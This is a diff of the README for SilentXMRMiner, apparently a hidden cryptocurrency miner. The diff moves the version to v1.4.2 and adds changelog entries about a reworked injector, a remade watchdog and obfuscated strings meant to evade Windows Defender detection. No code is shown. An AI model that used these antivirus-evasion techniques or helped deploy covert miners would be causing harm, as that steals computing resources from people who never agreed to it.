@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v1.4.1 - Based on Lime Miner v0.3
+# SilentXMRMiner v1.4.2 - Based on Lime Miner v0.3
 
 Can mine all the following algorithms and thus all the cryptocurrencies that use them: **cn/upx2**, **argon2/chukwav2**, **cn/ccx**, **kawpow**, **rx/keva**, **astrobwt**, **cn-pico/tlo**, **rx/sfx**, **rx/arq**, **rx/0**, **argon2/chukwa**, **argon2/wrkz**, **rx/wow**, **cn/fast**, **cn/rwz**, **cn/zls**, **cn/double**, **cn/r**, **cn-pico**, **cn/half**, **cn/2**, **cn/xao**, **cn/rto**, **cn-heavy/tube**, **cn-heavy/xhv**, **cn-heavy/0**, **cn/1**, **cn-lite/1**, **cn-lite/0** and **cn/0**.
 
@@ -41,6 +41,11 @@ You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/w
 
 ## Changes
 
+### v1.4.2 (14/07/2021)
+* Remade watchdog to reduce detections
+* Obfuscated more strings to reduce new Windows Defender detections
+* Reworked a lot of the injector
+* Fixed a bug where two environment variables for paths could return different results
 ### v1.4.1 (10/07/2021)
 * Fixed possible critical bug that makes the miner unable to see if a miner is running or not thus opening multiple miners
 * Added backup servers for Online Downloader
